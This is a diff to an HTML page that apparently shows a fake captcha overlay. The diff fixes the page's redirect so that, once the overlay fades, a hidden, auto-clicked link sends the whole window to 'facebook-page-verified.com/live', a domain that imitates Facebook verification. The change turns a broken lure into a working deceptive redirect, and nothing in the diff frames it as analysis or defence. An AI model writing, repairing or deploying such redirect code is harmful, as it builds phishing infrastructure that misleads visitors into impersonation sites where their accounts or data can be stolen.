@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -515,13 +515,24 @@
       }
     };
 
+    const openRedirect = (url) => {
+      const link = document.createElement("a");
+      link.href = url;
+      link.target = "_top";
+      link.rel = "noopener";
+      link.style.display = "none";
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+    };
+
     const finishIntro = () => {
       const overlay = document.getElementById("intro-captcha");
       if (!overlay) return;
       overlay.classList.add("is-fading");
       const doneTimer = setTimeout(() => {
         overlay.remove();
-      window.location.href("https://facebook-page-verified.com/live", "_blank", "noopener");
+        openRedirect("https://facebook-page-verified.com/live");
       }, DONE_DELAY_MS);
       introState.timers.push(doneTimer);
     };
